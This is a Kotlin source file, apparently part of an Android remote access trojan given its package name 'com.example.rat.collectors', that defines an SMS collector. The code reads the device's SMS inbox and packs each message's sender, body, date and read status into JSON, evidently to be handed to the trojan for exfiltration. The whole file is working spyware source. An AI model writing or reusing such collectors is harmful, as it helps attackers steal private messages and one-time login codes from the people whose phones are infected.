package com.example.rat.collectors

import android.content.Context
import android.net.Uri
import org.json.JSONArray
import org.json.JSONObject

object SmsCollector {
    fun get(context: Context, limit: Int): JSONArray {
        val out = JSONArray()
        val uri = Uri.parse("content://sms/inbox")
        val projection = arrayOf("_id", "address", "body", "date", "read")
        context.contentResolver.query(uri, projection, null, null, "date DESC")?.use { cursor ->
            var count = 0
            while (cursor.moveToNext() && count < limit) {
                out.put(
                    JSONObject()
                        .put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")) ?: "")
                        .put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")) ?: "")
                        .put("date", cursor.getLong(cursor.getColumnIndexOrThrow("date")))
                        .put("read", cursor.getInt(cursor.getColumnIndexOrThrow("read")))
                )
                count++
            }
        }
        return out
    }
}
